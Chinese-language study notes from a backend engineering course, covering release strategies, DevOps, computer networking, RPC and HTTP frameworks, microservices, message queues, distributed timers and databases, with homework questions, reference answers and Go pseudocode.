蛮力发布：简单粗暴，直接用新版本覆盖老版本。 金丝雀发布：由于金丝雀对瓦斯极其敏感，因此以前矿工开矿下矿洞前，先会放一只金丝雀进去探是否有有毒气体，看金丝雀能否活下来，金丝雀发布由此得名。 滚动发布：每个实例都通过金丝雀的方式逐步放大流量，对用户影响小，体验平滑 蓝绿发布：常备两个集群，先把流量全部切换到Group 1，升级Group2，然后再把流量全部切换到Group 2，升级Group 1。最终恢复流量。 红黑发布：与蓝绿发布类似，但是日常只有一个集群工作，发布时扩容一个集群升级新版本，切换流量后下掉老版本的集群。    发布过程要做的事\n 发布负责人  负责按照计划执行发布 需要通知各个相关人员发布进展 观察各个服务的发布状态，及时处理异常   变更服务的相关RD  按照上线checklist检查服务的日志，监控，响应上线过程中的告警 对于自己负责的改动，在小流量或者是预览环境进行功能验证 执行发布计划中的其他操作（如线上配置，数据处理等）   值班同学  发布过程中的监控和告警需要特别关注，如果有异常需要立刻判断是否由变更引起 如果有变更引起的告警或者用户反馈，需要及时中止发布      运维阶段 3. 怎样执行流程 DevOps  效率竖井  流程中实际产生价值的部分很短 大量的时间用在等待和传递上 人和人之间的沟通很慢     DevOps解决方案  代码管理 自动化测试 持续集成 持续交付    全流程自动化   通过效能平台串联各个阶段\n 需求发起研发流程的自动化 写代码，测试环境部署的自动化 自动化测试触发和报告分析 发布过程可观测融入流程    减少无价值的等待\n 分析整个流程的耗时，计算真正产生价值的时间 不断优化流程，让有价值的流程时间占比上升    参考文献   瀑布模型 zh.wikipedia.org/wiki/%E7%80…\n  Scrum: zh.wikipedia.org/wiki/Scrum\n  SAFe：\na. www.woshipm.com/pd/4331832.… b. en.wikipedia.org/wiki/Scaled…\n  CNCF：en.wikipedia.org/wiki/Cloud_…\n  常用的发布模式：www.cnblogs.com/Leo_wl/p/14…\n  课后作业：   敏捷宣言是什么？\n  Grooming meeting 的作用是什么？\n  我们为什么需要进行集成测试？\n  遇到线上问题，我们要做的四个关键动作是什么？\n  DevOps 包含了哪些流程？\n\u0026lt; 作业提交截止时间：5月17日 10:00前 \u0026gt;\n  正确答案：   敏捷宣言参考：agilemanifesto.org/iso/zhchs/m…\n  PO描述下个迭代希望实现的用户故事，PM提出需求列表\n  不同人开发的功能合并在一起测试，相互之间的影响可能产生缺陷；迭代发布的所有功能合并在一起测试，确保发布的所有功能之间的影响不产生缺陷\n  止损，周知，定位，修复\n  DevOps概念上，涵盖了软件交付生命周期的全流程，包含需求-\u0026gt;开发-\u0026gt;构建-\u0026gt;测试-\u0026gt;发布-\u0026gt;运维的研发环节\n  day7.1 计算机网络基本概念 https://live.juejin.cn/4354/yc_computer\nhttps://bytedance.feishu.cn/file/boxcneJVcYNfEn3umrE5K806h0g\nhttps://juejin.cn/post/7097126973163454494#heading-0\n刷抖音网络是怎么交互的？ 怎么让我的手机能访问抖音服务器 网络接入-互联网 网络接入-路由 交换机-同网段发包交互？\n找MAC地址就行，SDN（Software Defined Network）软件定义网络\n路由一定是对称的吗？\n不一定，去的时候可以是一条路，回来的时候另一条路\n路由是工作在哪一层协议？\nip层 传输层\n路由改的是IP地址吗？\n源IP地址和⽬标IP地址在传输过程中是不会变化的，只有源 MAC 地址和⽬标 MAC ⼀直在变化。\n动态路由BGP/OSPF？\nhttps://blog.csdn.net/weixin_43914604/article/details/105084158\nhttps://blog.csdn.net/weixin_43914604/article/details/105313629\n网络接入-ARP协议 逻辑同网段才能发送ARP？\nhttps://blog.csdn.net/weixin_43914604/article/details/105138313\nARP请求广播，应答单播\nARP的本质是寻求下一跳的MAC，而不是请求目标地址\n非同网段需要借助路由器的帮助\n免费ARP？\n免费告诉别人我的MAC地址\n免费 ARP（Gratuitous ARP）包是一种特殊的 ARP 请求，它并非期待得到 IP 对应的 MAC 地址\n免费 ARP 报文与普通 ARP 请求报文的区别在于报文中的目标 IP 地址。普通 ARP 报文中的目标 IP 地址是其他主机的 IP 地址；而免费 ARP 的请求报文中，目标 IP 地址是自己的 IP 地址。\nhttps://zhuanlan.zhihu.com/p/371088648\nARP代理？\n网络接入-IP协议 唯一标识，互联网通用。抖音客户端一个、抖音服务端一个\nMac地址不能替代IP地址吗？\nhttps://www.cnblogs.com/botoo/p/7793036.html\n IP地址是网络层使用的地址，它是分层次等级的。 硬件地址是数据链路层使用的地址(如MAC地址)，它是平面式的。  随着网络中的设备逐渐增多，人们发现路由（也就是寻找数据包从发送方到接收方的路径）变得越来越困难了\nMAC 地址就像自己的 ID 号，而 IP 地址就像带着邮政编码的住址，各有各的用途。所以我们需要两个地址，缺一不可。\nIPv4不够用，一般怎么解决？\nNAT、IPv6\n网络接入-NAT 家里路由器是怎样上网的？\n(Network Address Translation)网络地址转换\n私有地址（10 172 192）\u0026ndash;公用地址\n该网络中的主机使用私用IP地址.当私有网络内部主机和外部Internet通信时,网关(gateway)路由器负责将私有IP地址转换为全球IP地址\n多个内网客户端访问同一个目标地址+端口，源端口恰好一样，冲突了？\nNAPT\n(Network Address and Port Translation)\n把端口也变了\n网络打通了怎么下载视频 网络传输-数据包 网络传输-数据包发送 网络传输-先请求DNS https://blog.csdn.net/weixin_43914604/article/details/105583806\n网络传输-DNS的传输协议UDP 由于过于简单，用好很难\n发包每次发多少？怎么避免切片？\nMTU（数据帧最大传输单元）有限制，∴要分片\n怎么知道没有丢包？\n怎么权衡传输效率与质量？\n网络传输-TCP三次握手 拔了网线，连接会断吗？\n看具体情况。\n假设TCP有探活，假设刚好在一次探活后拔了网线，不会立马断开\n你真的了解TCP三次握手？\n最大报文段长度（MSS）是TCP协议的一个选项，用于在TCP连接建立时，收发双方协商通信时每一个报文段所能承载的最大数据长度（不包括文段头）。为了避免IP切片\n区分MSS与MTU\n最大报文段长度（MSS）与最大传输单元（Maximum Transmission Unit, MTU）均是协议用来定义最大长度的。不同的是，MTU应用于OSI模型的第二层数据链接层，并无具体针对的协议。MTU限制了数据链接层上可以传输的数据包的大小，也因此限制了上层（网络层）的数据包大小。例如，如果已知某局域网的MTU为1500字节，则在网络层的因特网协议（Internet Protocol, IP）里，最大的数据包大小为1500字节（包含IP协议头）。MSS针对的是OSI模型里第四层传输层的TCP协议。因为MSS应用的协议在数据链接层的上层，MSS会受到MTU的限制\nTCP的有限状态机\n为什么老问你Timewait？\n等待足够的时间以确保远程 TCP 收到其连接终止请求的确认。\nhttps://blog.csdn.net/mystyle_/article/details/119176327\n丢包怎么办？\nhttps://blog.csdn.net/weixin_43914604/article/details/105524592\n滑动窗口\n流量控制/拥塞控制\nhttps://blog.csdn.net/weixin_43914604/article/details/105531547\nhttps://blog.csdn.net/weixin_43914604/article/details/105532044\n网络传输-HTTP/HTTP1.1 为什么不直接用TCP通信？\nTCP内容太多了，编程麻烦\n其实HTTP只是多加了一层规矩，HTTP仍然是TCP，只是这个规矩让用户更清晰\nhttps://www.cnblogs.com/heluan/p/8620312.html\nhttps://zhuanlan.zhihu.com/p/266578819\n网络传输-HTTPS 网络传输-SSL/TLS握手 https://www.jianshu.com/p/6811285c577d\n网络架构怎么给抖音提质？ 网络提速-HTTP2.0 网络提速-如何理解多路复用/stream 单个TCP链接传输\n实际上stream还是串行的\n如果TCP丢包怎么办？\nTCP队头阻塞，TCP有个option，可以指定ack的序列号，指定需要重传的\n网络提速-QUIC/HTTP3.0 TCP or UDP?\n改TCP动一发而牵全身\nKernel or Userspace?\n0RTT\n弱网优势\n网络提速-数据中心分布 核心机房\nPOP接入\n边缘机房\n汇聚机房\n网络提速-同运营商访问 网络提速-静态资源路径优化（CDN） Content Delivery Network，即内容分发网络\n网络提速-动态API路径优化（DSA） 网络稳定-容灾概念 故障发生\n故障感知\n自动切换\n服务恢复\n专线\n外网容灾\n云控？\nweb页面不能嵌入SDK、用户权限、\n网络稳定-故障排查 故障明确 出现了什么故障？-\u0026gt;沟通是前提\n什么业务?什么接口障碍?\n故障体现在哪里？\n访问其他目标是否正常？\n是否是修改导致的异常？\n故障止损 先止损再排查\n分段排查 网络稳定-网络故障排查常用命令 课后作业1- UDP socket 实现 ack，感知丢包重传 作业要求：\n  学会 UDP socket 编程\n  先从简单的 ack 学习，客户端等待 ack 再发包\n  什么时候客户端认为是丢包？\n  重传怎么考虑效率？\n  能不能不阻塞只穿丢掉的中间的段？\n  课后作业2- 三台同网段内的服务器，模拟实现一个路由器 方法一: Linux 操作系统配置法\n提示：\n  了解Linux的路由配置方式\n  确保是同网段直连可达的环境。在三台机器上另外配置IP网段和路由\n  一台机器做客户端，一台机器做路由器，一台机器做服务端\n  客户端配置到达服务器的下一跳指向路由器，路由器上配置到达服务端的路由\n  方法二: 用户态 socket 编程实现简易 route 软件\n提示：\n  收到指定的包后，做转发\n  注意是修改报文的 MAC ，不是修改 IP\n  实现一个对称路由。这样可以实现 TCP 交互\n  可以通过 ping 来验证\n  可以支持 traceroute 吗？\n\u0026lt; 作业提交截止时间：5月17日 10:00前 \u0026gt;\n  正确答案： 课后作业1： 开放性问题，答案只要合理即可。具体实现可以参考\nhttps://github.com/networkprotocol/reliable\n根据作业要求的顺序一点点去实现，由简单ack功能入手到复杂的流控。\n课后作业2： 开放性问题，答案只要合理即可。具体实现可以参考：\n  静态路由表的注入可以在代码内用全局变量表示，也可以写一个配置文件去注入。\n  socket编程收raw包\n  解析raw包的IP层数据，根据静态路由表找到目标IP的下一跳\n  获取下一跳的MAC地址（linux有命令/系统调用接口，也可以自己实现简单的arp请求，保存目标MAC地址）\n  修改目标MAC地址为下一跳的MAC，修改源MAC地址为本机的出口网卡MAC。\n  ttl记得-1，然后转发数据包。\n  day7.2 如何将我的服务开放给用户 https://live.juejin.cn/4354/yc_open-serve\nhttps://bytedance.feishu.cn/file/boxcnUDmxxNLZjEd8oC17wFRRTe\n企业接入升级打怪之路\n域名系统 host管理的问题 流量和负载\n名称冲突\n时效性\n域名购买和配置迁移 自建DNS服务器 权威DNS系统 https://www.bilibili.com/video/BV1Mf4y1C7V8?spm_id_from=333.337.search-card.all.click\n常见的开源DNS：bind、nsd、knot、coredns\nHTTPS协议 HTTP明文传输，弊端越来愈明显\n对称加密和非对称加密 SSL的通信过程 证书链 接入全站加速 源站容量低，可承载的并发请求数低\n报文经过的网络设备越多，出问题的概率越大\n自主选路网络链路长\n静态加速CDN 动态加速DCDN 基于智能选路技术，从众多回源路线中择优选择一条路线进行传输\n四层负载均衡 https://blog.csdn.net/hanjinjuan/article/details/120274878\n七层负载均衡 https://www.cnblogs.com/cheyunhua/p/10670070.html\nhttps://blog.csdn.net/lamp_yang_3533/article/details/80383039\nday8.1 架构初探 https://live.juejin.cn/4354/yc_cake\nhttps://bytedance.feishu.cn/file/boxcne8xf0JBAiXgPJ08Vf0IdJg?hash=d3d3a460879da375f28cee06d470b5aa\n什么是架构 有关软件整体结构与组件的抽象描述\n用于指导软件系统各个方面的设计\n单机 All in one，所有的东西都在一个进程里，部署在一个机器上。\n优点：\n 简单  缺点：\n  运维需要停服，用户体验较差\n  承载能力有限。了解下 c10k 问题\n  单体、垂直切分 在单机架构的基础上，将进程部署到多个机器上。\n优点：\n  具备水平扩容能力\n  运维不需要停服\n  缺点：\n  后端进程职责太多，越来越臃肿\n  爆炸半径较大，进程中一个很小的模块出现问题，都可能导致整个进程崩溃\n  SOA SOA 架构中，服务为一等公民，将进程按照不同的功能单元进行抽象，拆分为『服务』。有了服务之后，SOA 还为服务之间的通信定义了标准，保证各个服务之间通讯体验的一致性。\n优点：\n  各服务的职责更清晰\n  运维粒度减小到服务，爆炸半径可控\n  缺点：\n ESB (企业服务总线) 往往需要一整套解决方案  微服务 在 SOA 架构中，ESB 起到了至关重要的作用。但从架构拓扑来看，它更像是一个集中式的模块。有一个 SOA 分布式演进的分支，最终的形态便是微服务。\n优点：\n  兼具 SOA 解决的问题\n  服务间的通信更敏捷、灵活\n  缺点：\n 运维成本 服务间通信成本问题； 数据一致性问题  小结   架构演进的初衷：满足软件迭代诉求，提高迭代效率\n  架构演进的思路：垂直切分——分布式，水平切分——分层/模块化\n  企业级后端架构剖析 https://www.zhihu.com/question/20387284\n云计算基础：   虚拟化技术\n 硬件层面（VM 虚拟机）- KVM/Xen/VMware 操作系统层面（Container 容器）- LCX/Docker/Kata Container 网络层面 - Linux Bridge/Open v Switch    编排方案\n VM - OpenStack/VMWare Workstation Container - Kubernetes/Docker Swarm    云计算架构：   云服务\n IaaS - 云基础设施，对底层硬件资源池的抽象 PaaS - 基于资源池抽象，对上层提供的弹性资源平台 SaaS - 基于弹性资源平台构建的云服务 FaaS - 更轻量级的函数服务。好比 LeetCode 等 OJ，刷题时只需要实现函数，不需要关注输入输出流    云部署模式（拓展）\n 私有云 - 企业自用 公有云 - AWS/Azure/Google Cloud/Huawei 混合云    云原生 云原生，实际是云原生（计算）的简称，它是元计算发展到现在的一种形态。\n云原生技术为组织（公司）在公有云、自由云、混合云等新型的动态环境中，构建和运行可弹性拓展的应用提供了可能。 它的代表技术：\n  弹性资源\n  微服务架构\n  DevOps\n  服务网格\n  弹性资源 基于虚拟化技术，提供的可以快速扩缩容的能力。可以分为弹性计算资源和弹性存储资源两个方面。 弹性计算资源：\n  计算资源调度\n 在线计算 - 互联网后端服务 离线计算 - 大数据分析。Map-Reduce/Spark/Flinnk    消息队列\n 在线队列 - 削峰、解耦 离线队列 - 结合数据分析的一整套方案，如 ELK    弹性存储资源：\n  经典存储\n 对象存储 - 视频、图片等。结合 CDN 等技术，可以为应用提供丰富的多媒体能力 大数据存储 - 应用日志、用户数据等。结合数据挖掘、机器学习等技术，提高应用的体验    关系型数据库\n  元数据\n 服务发现    NoSQL\n KV 存储 - Redis 文档存储 - Mongo    在云原生的大背景下，不论是计算资源还是存储资源，他们都像是服务一样供用户使用。\n微服务架构 微服务架构下，服务之间的通讯标准是基于协议而不是 ESB 的。\n  HTTP - H1/H2\n  RPC - Apache Thrift/gRPC\n  如何在 HTTP 和 RPC 之间选择？\n  性能 - RPC 协议往往具备较好的压缩率，性能较高。如 Thrift, Protocol Buffers\n  服务治理 - RPC 中间件往往集成了丰富的服务治理能力。如 熔断、降级、超时等\n  可解释性 - HTTP 通信的协议往往首选 JSON，可解释性、可调试性更好\n  服务网格 什么是服务网格？\n  微服务之间通讯的中间层\n  一个高性能的 4 层网络代理\n  将流量层面的逻辑与业务进程解耦\n  没有什么是加一层代理解决不了的问题，服务网格相比较于 RPC/HTTP 框架：\n  实现了异构系统治理体验的统一化\n  服务网格的数据平面代理与业务进程采取进程间通信的模式，使得流量相关的逻辑（包含治理）与业务进程解耦，生命周期也更容易管理\n  企业级后端架构的挑战 挑战 基础设施层面： Q：我们总说，云是弹性的，也就是说，在用户的角度，云提供的资源是无限的。然而，云背后的物理资源是有限的。在企业级后端架构里，云如何解决近乎无限的弹性资源和有限的物理资源之间的矛盾？\nQ：闲事的资源就这么空着呢？如何提高资源利用率，提高物理资源的价值转换率？\n用户层面： Q：上了云原生微服务后，服务之间的通信开销较大，应该如何做成本优化？\nQ：微服务看起来没有那么美好，抖动导致的运维成本较高，如何解决？\nQ：异构的物理环境应该对用户是透明的，如何屏蔽这些细节？\n离在线资源并池 考虑到在线业务的潮汐性，物理资源的用量不是一成不变的。离在线资源并池，可以：\n  提高物理资源利用率\n  提供更多的弹性资源\n  后端架构实践 day8.2 git https://bytedance.feishu.cn/file/boxcnsl8BgASj1TA9lzYb0TevEg?hash=8b34156117fb8fbc4eb72588c99e1adc\nhttps://live.juejin.cn/4354/yc_Git-posture\nday9 数据结构与算法 https://live.juejin.cn/4354/yc_data-correlation/preload\nhttps://bytedance.feishu.cn/file/boxcnZoRBfHvkwiwXC5qKft4L7b\n课后作业-实现 pdqsort-Version 1 作业要求：\n完成 PPT 中 pdqsort v1 版本，可以正确对元素排序\n\u0026lt; 作业提交截止时间：5月21日 10:00前 \u0026gt;\n正确答案： https://github.com/zhangyunhao116/sortlearning/blob/master/pdqsort.go\nday10.1 RPC框架 https://live.juejin.cn/4354/yc_RPC-framework/preload\nhttps://bytedance.feishu.cn/file/boxcnQ289aixfQUmvgtDDn98mmf\nRPC 相关的基本概念 RPC（Remote Procedure Call）远程过程调用协议，一种通过网络从远程计算机上请求服务，而不需要了解底层网络技术的协议。RPC它假定某些协议的存在，例如TPC/UDP等，为通信程序之间携带信息数据。在OSI网络七层模型中，RPC跨越了传输层和应用层，RPC使得开发，包括网络分布式多程序在内的应用程序更加容易。\n过程是什么？ 过程就是业务处理、计算任务，更直白的说，就是程序，就是想调用本地方法一样调用远程的过程\n==1：通讯协议== 比如：你需要找人在国外干活，那么你可以直接飞过去或者打电话或者通过互联网的形式，去找人，这个找人的过程就是通讯协议 ==2：寻址== 既然要找人干活，肯定要知道地址在哪，飞过去需要找到详细地址，打电话需要知道电话号码，互联网需要知道IP是多少 ==3：数据序列化== 就是说，语言需要互通，才能够让别人干活，之间需要一个大家都懂的语言去交流\n  RPC的概念模型：User、User-Stub、RPC-Runtime、Server-Stub、Server\n 来自论文《Implementing Remote Procedure Calls》    IDL(Interface Definition Language) 文件\n Thrift Protobuf    生成代码\n  编解码（序列化/反序列化）\n  通信协议\n 应用层协议    网络通信\n IO 网络模型  blocking IO unblocking IO IO multiplexing signal driven IO asynchronous IO   传输层协议  TCP UDP      RPC 框架的分层设计   编解码层\n 数据格式：  语言特定格式 文本格式 二进制编码  TLV 编码：Thrift 使用 TLV 编码 Varint 编码：Protobuf 使用 Varint 编码     选项：  兼容性 通用型 性能      传输协议层\n 消息切分  特殊结束符 变长协议：length+body   协议构造  以 Thrift 的 THeader 协议为例讲解      网络通信层\n 网络库 核心指标  吞吐高 延迟低      衡量 RPC 框架的一些核心指标   稳定性\n 保障策略  熔断 限流 超时   请求成功率  负载均衡 重试   长尾请求  BackupRequest      易用性\n 开箱即用 周边工具    扩展性\n  观测性\n Log Metric Tracing 内置观测性服务    高性能\n  字节内部 RPC 框架 Kitex 实践分享  Kitex 整体架构 自研网络库 Netpoll 性能优化：  网络库优化 编解码优化   合并部署  课后作业- 重点内容 Review   行业内各个流行的 RPC 框架的优劣对比？\n  从第三章节 RPC 的核心指标来看，Kitex 还有哪些功能是欠缺或者需要加强的？\n  了解微服务的新趋势 ServiceMesh，以及 RPC 框架和 ServiceMesh 的关系\n  关于 RPC 框架，业界有哪些新的趋势和概念？\n  Netpoll 的优势在哪？相比其他高性能网络库例如 Netty 还有什么不足？\n  Flatbuffer 和 Cap\u0026rsquo;n Proto 等编解码协议为什么高性能？\n\u0026lt; 作业提交截止时间：5月24日 10:00前 \u0026gt;\n  day10.2 HTTP修炼知道 https://live.juejin.cn/4354/yc_practise/preload\nhttps://bytedance.feishu.cn/file/boxcnfWxLoNVpn36D041DdKP6Vg\n再谈HTTP协议 HTTP框架的设计与实现 性能修炼之道 企业实践 课后作业-重点内容 Review 作业要求：\n  为什么 HTTP 框架做要分层设计？分层设计有哪些优势与劣势。\n  现有开源社区 HTTP 框架有哪些优势与不足。\n  中间件还有没有其他实现方式？可以用伪代码说明。\n  完成基于前缀路由树的注册与查找功能？可以用伪代码说明。\n  路由还有没有其他的实现方式？\n\u0026lt; 作业提交截止时间：5月24日 10:00前 \u0026gt;\n  正确答案： 该问题为开放性问题，答案合理即可。\n  优势：\n 分层设计可以提高框架的扩展性、可维护性、复用性 分层设计可以让相关同学聚焦在核心层上而不用关心其他层的实现 劣势： 提高代码设计的复杂性，设计不好可能会导致循环依赖 由于使用接口进行解耦，可能会对代码性能造成影响    gin：易用性强；生态丰富，但扩展性一般，性能一般。\n fasthttp：性能强；扩展性一般，生态一般。 go-zero：开箱即用，提供全套微服务能力，但扩展性一般，性能一般。    课程中讲的中间件模型需要有一个地方保存 index，对于没有 index 的场景，可以将中间件构造为递归函数进行调用。\n  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  // Endpoint represent one method for calling from remote. type Endpoint func ( ctx context.Context, req, resp interface {}) ( err error )  // Middleware deal with input Endpoint and output Endpoint. type Middleware func ( Endpoint ) Endpoint  // Chain connect middlewares into one middleware. func chain ( mws ...Middleware ) Middleware { return func ( next Endpoint ) Endpoint { for i := len ( mws ) - 1; i \u0026gt;= 0; i-- { next = mws [ i ]( next ) } return next  } } 复制代码    伪代码如下，可以使用递归实现，也可以使用其他更高性能的实现，这里提供递归的实现方式。  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73  func ( r *router ) addRoute ( path string, h app.HandlersChain ) { // 检查 path 合理性  checkPathValid ( path ) // 循环添加 path 中的每一段  for i range len ( path ) { // 处理 : 类型参数路由  if path [ i ] == \u0026#34;:\u0026#34; { // 添加 : 之前的静态路由  Insert ( path [ :i ] , staticKind, nil ) // 处理参数名称  paramNames.add ( paramName ) // 判断当前是否是路由 path 的最后一段  if last { // 插入最后一段  Insert ( path [ i: ] , paramKind, handler ) return  } else { // 不是最后一段，插入该段后继续插入之后的部分。  Insert ( path [ i: ] , paramKind, nil ) } // 处理 * 号类型参数路由  } else if path [ i ] == \u0026#34;*\u0026#34; { // 添加 * 路由之前的部分  Insert ( path [ :i ] , staticKind, nil ) // 处理参数名称  paramNames.add (paramName) // 添加最后一段  Insert ( path [ i: ] , allKind, handler ) return  } } // 添加最后的静态路由  Insert ( path [ i: ] , staticKind, handler ) }  func find ( path string ) () {  // 匹配静态路由  if matchStaticKind { nextSearchPath = handleStaticKind ( path, node ) path = nextSearchPath  } // 匹配 param 路由  if matchParamKind { nextSearchPath = handleParamKind ( path, node ) path = nextSearchPath  } // 匹配 * 路由  if matchAllKind { nextSearchPath = handleAllKind ( path, node ) path = nextSearchPath  } // 判断是否找到  if endcondition { return  }  // 递归搜索下一段静态路由  for node := range allStaticKindNodeChildren { if prefixMatch { node.find ( path ) } } // 搜索下一段 param 路由  if node.HasParamKindChild { node.find ( path)  } // 搜索下一段 * 路由  if node.HasAllKindChild { node.find ( path)  } return } 复制代码    可以尝试使用正则匹配的方式注册路由  day11.1 微服务框架 https://bytedance.feishu.cn/file/boxcnPjF5oJxpZh4ZQYDwVCSxib\n微服务架构介绍 微服务架构概览 微服务架构的核心要素 服务治理\n可观测性\n安全\n微服务架构原理及特征 基本概念 服务\n实例\n集群\n实例承载形式\n服务注册及发现 无损的服务实例上下线流程 微服务架构中的基本流量特征 核心服务治理功能 服务发布 流量治理 负载均衡 稳定性治理 字节跳动服务治理实践 重试\n课后作业- 重点内容 Review   结合 CAP 等原理，思考微服务架构有哪些缺陷？\n  微服务是否拆分得越“微”越好？为什么？\n  Service Mesh 这一架构是为了解决微服务架构的什么问题？\nhttps://philcalcado.com/2017/08/03/pattern_service_mesh.html\nhttps://zhuanlan.zhihu.com/p/61901608\n  有没有可能有这样一种架构，从开发上线运维体验上是微服务，但实际运行又类似单体服务？\n  day11.2消息队列 https://bytedance.feishu.cn/file/boxcnKXjTxtmdCpdidtJZGckf5b\nhttps://live.juejin.cn/4354/yc_message-queue/preload\n解耦：系统崩溃\n削峰：服务处理能力有限\n异步：链路耗时长尾\n日志处理：日志如何处理\n前世今生 消息队列：支持高吞吐、高并发、高可用的队列\n消息队列Kafka kafka使用场景，业务日志、用户行为数据、Metrics数据\n基本概念，Producer、Cluster、Consumer、Topic、Partition\n数据迁移、Offset、Partition选主\n一条消息从生产到消费是如何处理的，Producer端逻辑、Broker端逻辑、Consumer端逻辑\nProducer端逻辑 批量发送、数据压缩\nBroker端逻辑 顺序写、消息索引、零拷贝\nConsumer端逻辑 Rebalance\n问题：\n运维成本高\n对于负载不均衡的场景，解决方案复杂\n没有自己的缓存，完全依赖于Page Cache\n消息队列BMQ 课后作业：   消息队列的应用场景有哪些？\n  Kafka 的哪些 Feature 让其可以支撑大吞吐写入的场景？\n  Kafka Consumer Rebalance 的流程简述？\n  BMQ 相比较 Kafka 有哪些优势？\n  RocketMQ 有哪些特有的 Feature？\n  RocketMQ 事务消息处理流程简述？\n  你认为 MQ 后面应该如何发展？（开放题）\n  day12.1 分布式定时器 https://bytedance.feishu.cn/file/boxcnxSIthZayPmlXZWdYx845qg\n前言   每年春节抖音都会有很多有意思的玩法，如果同学们是字节的后端同学，怎么设计今年春节集卡瓜分20亿的技术方案？\n  业务流程\n 定时扫描抖音用户集卡状态 汇总计算用户的瓜分金额 定时开奖    技术体量\n 亿级用户规模 十亿级资金规模 百万级读写QPS    方案引出\n 自动化 + 定时执行 + 海量数据 + 高效稳定 = 分布式定时任务    发展历程 Windows批处理\nwindows任务计划程序\nLinux CronJob\n单机定时任务Timer\tTicker\n单机定时任务 ScheduledExecutorService\n任务调度Quartz\n分布式定时任务 定义  定时任务是指系统为了自动完成特定任务，实时、延时、周期性完成任务调度的过程。 分布式定时任务是把分散的、可靠性差的定时任务纳入统一的平台，并实现集群管理调度和分布式部署的一种定时任务的管理方式。  按触发时机分类： 定时任务：特定时间触发，比如今天15:06执行 延时任务：延时触发，比如10s后执行 周期任务：固定周期时间，或固定频率周期调度触发，比如每隔5s或者每天12点执行\n特点 自动化：全自动完成定时任务的调度和执行 平台化：基于平台化的思维管控一系列的分布式定时任务 分布式：在分布式系统环境下运行任务调度，突破单机定时任务的性能瓶颈 伸缩性：采用集群方式部署，可以随时按需扩缩容 高可用：单点故障不影响最终任务结果，可以做到故障转移\n执行模式 单机任务：随机触发一台机器执行任务，适用于计算量小、并发度低的任务 广播任务：广播到所有机器上执行同一个任务，比如所有机器一起清理日志 Map任务：一个任务可以分出多个子任务，每个子任务负责一部分的计算。适用于计算量大，单机无法满足要求的任务 MapReduce任务：在Map任务的基础上，还可以对所有子任务的结果做汇总计算，适用于计算量大，并且需要对子任务结果做汇总的任务\n分布式定时任务VS单机定时任务 关系： 都可以实现自动化的定时、延时、周期任务调度 差异： 分布式定时任务可支撑更大的业务体量 分布式定时任务的性能、伸缩性、稳定性更高\n分布式定时任务VS大数据处理引擎 关系： 都可以对海量数据做处理 性能、伸缩性、稳定性都很高 差异： 定时并不是大数据处理引擎要解决的核心问题 大数据处理引擎往往致力于将源数据处理成结果数据，分布式定时任务除了能做这个之外，还可以调用HTTP和RPC服务\n业内流行框架：Xxl-job、SchedulerX、TCT 实现原理 分布式定时任务核心要解决触发、调度、执行三个关键问题\n触发器：Trigger，解析任务，生成触发事件 调度器：Scheduler，分配任务，管理任务生命周期 执行器：Executor，获取执行任务单元，执行任务逻辑\n除此之外，还需要提供一个控制台（Admin），提供任务管理和干预的功能。\n基本概念 任务：Job，任务元数据 任务实例：JobInstance，周期任务会生成多个任务实例 任务结果：JobResult，任务实例运行的结果 任务历史：JobHistory，用户可以修改任务信息，任务实例对应的任务元数据可以不同，因而使用任务历史存储\n触发器 核心职责 给定一系列任务，解析它们的触发规则，在规定的时间点触发任务的调度\n设计约束 需支持大量任务 需支持秒级的调度 周期任务需要多次执行 需保证秒级扫描的高性能，并避免资源浪费\n方案一 定期扫描+延时消息（腾讯、字节方案）\n方案二 时间轮（ Quartz 所用方案） 时间轮是一种高效利用线程资源进行批量化调度的一种调度模型。时间轮是一个存储环形队列，底层采用数组实现，数组中的每个元素可以存放一个定时任务列表。\n多级时间轮\n触发器 高可用\n课后作业- 重点内容 Review   分布式定时任务可以帮助我们处理哪些业务场景？\n  春节集卡瓜分20亿的玩法，发奖金额计算、实时开奖两个阶段分别用到分布式定时任务什么执行方式？\n  有了分布式定时任务，单机定时任务还有适用场景么？\n  时间轮这种数据结构，在定时/延时场景相比其他数据结构有哪些优势？\n  分布式定时任务的调度中心怎么判断一台执行器的机器处于可被调度状态？\n  你能想到哪些业务场景，实时计算引擎优于分布式定时任务？\n\u0026lt; 作业提交截止时间：5月26日 10:00前 \u0026gt;\n  正确答案：   所有需要定时、延时、周期性执行任务的业务场景，都可以考虑使用分布式定时任务。在电商、游戏、互动等多个业务领域中都有广泛应用。\n  MapReduce任务和Map任务。由于发奖金额计算时需要汇总计算所有用户的集卡状态，因而在Map之后还需要对子任务的结果做汇总计算；而实时开奖则只需要对全量集齐的用户发奖即可。\n  有，比如定时刷新每台机器中的缓存、定期清理机器日志等。\n  相比于链表、最小堆，时间轮的查询和修改的时间复杂度都是O(1)。\n  执行器的机器首先需要调用调度中心的注册服务将本机器注册上去，并且需要定期状态上报供调度中心监控机器状态。\n  需要实时统计大规模流式数据，只需要做数据处理，无需调用RPC/HTTP接口做其他额外处理的业务场景，比较典型的例子是电商双十一的大屏，实时统计当前的GMV、订单量等\n  day12.2 存储与数据库 https://bytedance.feishu.cn/file/boxcn27GCEstXUOpBYFEpAY3EIh\n课后作业-实现一个（分布式）key-value 存储系统 作业要求：\n  基于本地文件系统实现，支持常用的 put(k, v)、get(k, v)、scan_by_prefix(prefix) 接口\n  支持存储 server 独立进程部署，支持跨进程或者网络访问\n  IO 操作做到低时延\n  *可选： 支持扩展成分布式架构，多台存储server组成一个分布式key-value存储系统，并保证全局的数据一致性。\n\u0026lt; 作业提交截止时间：5月26日 10:00前 \u0026gt;\nday13 深入理解RDBMS https://bytedance.feishu.cn/file/boxcnXzUnOJI7nUFhvBMTW9sfBh?hash=a90b5ab6be81c4d6ca20bf103bd9ab65\n课后作业- 重点内容 Review   WAL 日志到底是如何保证数据的持久化，宕机后数据不丢失的？\n  相比于其他方案，WAL 日志都有什么优势？\n  除了 Undo Log 之外，是否还有其他方案可以实现 MVCC？\n  基于代价的优化器一般需要考虑哪些代价？\n  执行器的执行模型，除了本课中提到的火山模型是否还有其他模型？\n  B+ Tree的优点有哪些？\n  InnoDB 的 buffer pool 是怎么实现页面管理和淘汰的？\n\u0026lt; 作业提交截止时间：5月28日 10:00前 \u0026gt;\n  正确答案：   